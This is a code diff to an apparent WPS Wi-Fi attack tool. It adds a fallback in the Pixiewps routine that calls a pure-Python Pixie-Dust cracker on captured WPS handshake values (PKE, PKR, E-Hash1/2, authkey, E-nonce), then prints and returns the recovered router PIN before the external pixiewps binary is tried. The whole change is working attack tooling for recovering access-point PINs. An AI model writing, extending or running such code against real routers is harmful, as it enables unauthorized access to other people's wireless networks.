@@ -753,6 +753,21 @@ class Companion:
         return True
 
     def __runPixiewps(self, showcmd=False, full_range=False):
+        # Try the built-in pure-Python cracker first (fast modes: Ralink/MediaTek
+        # + trivial cases, no binary). --pixie-force wants the full sweep, which
+        # only the C pixiewps does, so skip the Python path then.
+        if not full_range:
+            try:
+                import pixie
+                pin = pixie.recover_pin_hex(
+                    self.pixie_creds.pke, self.pixie_creds.pkr,
+                    self.pixie_creds.e_hash1, self.pixie_creds.e_hash2,
+                    self.pixie_creds.authkey, self.pixie_creds.e_nonce)
+            except Exception:
+                pin = None
+            if pin:
+                print('[+] WPS pin recovered (built-in Pixie-Dust): {}'.format(pin))
+                return pin
         print("[*] Running Pixiewps…")
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
